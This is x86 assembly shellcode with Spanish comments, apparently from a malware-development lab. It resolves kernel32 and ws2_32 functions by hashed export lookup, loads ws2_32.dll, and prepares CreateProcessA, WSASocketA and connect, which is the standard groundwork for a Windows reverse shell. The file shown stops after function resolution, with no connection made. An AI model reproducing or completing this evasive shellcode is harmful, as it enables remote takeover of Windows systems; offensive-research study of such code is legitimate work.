[BITS 32]

_start:
    call geteip

geteip:
    pop edx
    lea edx, [edx - 5]

; -----------------------------------
; VARIABLES LOCALES
; -----------------------------------
BaseKernel32        equ -0x4
; Array para las funciones resultas de kernell32
WaitForSingleObject equ -0x8
TerminateProcess    equ -0xC
LoadLibraryA        equ -0x10
ExitProcess         equ -0x14
CreateProcessA      equ -0x18
CloseHandle         equ -0x1c ; Cabeza del array

BaseWs2_32          equ -0x20
; Array para las funciones resultas de ws2_32
connect             equ -0x24
closesocket         equ -0x28
WSAStartup          equ -0x2c
WSASocketA          equ -0x30
WSACleanup          equ -0x34 ; Cabeza del array


hSocket             equ -0x30   ; size 0x4
wsaData             equ -0x34   ; size 0x190
server              equ -0x1c4  ; size 0x10
startupinfo         equ -0x1d4  ; size 0x44
processinfo         equ -0x218  ; size 0x10

; -----------------------------------
; INIT Stack frame
; -----------------------------------
push    ebp         ; guardo ebp del stack frame anterior
mov     ebp, esp    ; inicializo el nuevo
sub     esp, 0x300  ; mejor que sobre

; -----------------------------------
; Obtener base de kernell32.dll
; -----------------------------------
push    edx

mov     eax, [edx + KERNEL32]
push    eax ; (1º arg) module_hash
call    _get_module_handle ; void* get_module_handle(uint32_t module_hash);
mov     [ebp + BaseKernel32], eax
add     esp, 0x4

pop     edx

; -----------------------------------
; Resolver functions from Kernell32
; -----------------------------------
push    edx

lea     eax, [ebp + CloseHandle]
push    eax ; (3º arg) ptr_dest  
lea     eax, [edx + KERNEL32_DEF_HASHES]
push    eax ; (2º arg) ptr_source
mov     eax, dword [ebp + BaseKernel32]
push    eax ; (1º arg) base_module
call    _multi_import ; uint32_t multi_import(uint32_t base_module, ptr* ptr_source, ptr* ptr_dest)
add     esp, 0xC

pop     edx

; -----------------------------------
; Cargar ws2_32.dll
; -----------------------------------
push    edx

lea     ebx, [edx + WS2_32_STR]
push    ebx ; (1º arg) module_name
mov     eax, [ebp + LoadLibraryA]
call    eax ; LoadLibraryA __stdcall (limpia la pila)
mov     [ebp + BaseWs2_32], eax

pop     edx

; -----------------------------------
; Resolver functions from ws2_32.dll
; -----------------------------------
push    edx

lea     eax, [ebp + WSACleanup]
push    eax ; (3º arg) ptr_dest
lea     eax, [edx + WS2_32_DEF_HASHES]
push    eax ; (2º arg) ptr_source
mov     eax, dword [ebp + BaseWs2_32]
push    eax ; (1º arg) base_module
call    _multi_import ; uint32_t multi_import(uint32_t base_module, ptr* ptr_source, ptr* ptr_dest)
add     esp, 0xC

pop     edx

; -----------------------------------
; END
; -----------------------------------
mov esp, ebp    ; limpia la pila
pop ebp         ; restaura el viejo frame pointer
ret             ; vuelve a la dirección de retorno


; -----------------------------------
%include "C:\Users\test\Desktop\mal-dev-lab\shellcodes\x86\runtime_linking\asm\exports.asm"
; -----------------------------------

KERNEL32:       dd 0x4b1ffe8e
WS2_32_STR:     db 'ws2_32.dll', 0

KERNEL32_DEF_HASHES:
    dd 0x723EB9D5   ; CloseHandle:          
    dd 0x46718AE6   ; CreateProcessA:       
    dd 0x9590A319   ; ExitProcess:          
    dd 0xC8E88006   ; LoadLibraryA:           
    dd 0x9e6f6842   ; TerminateProcess:       
    dd 0xc547757b   ; WaitForSingleObject:
    dd 0xFFFFFFFF    


WS2_32_DEF_HASHES:
    dd 0xaff835ad   ; WSACleanup:
    dd 0xcebab524   ; WSASocketA:
    dd 0xed9ef56d   ; WSAStartup:
    dd 0x939d7d9c   ; closesocket:
    dd 0xedd8fe8a   ; connect:
    dd 0xFFFFFFFF
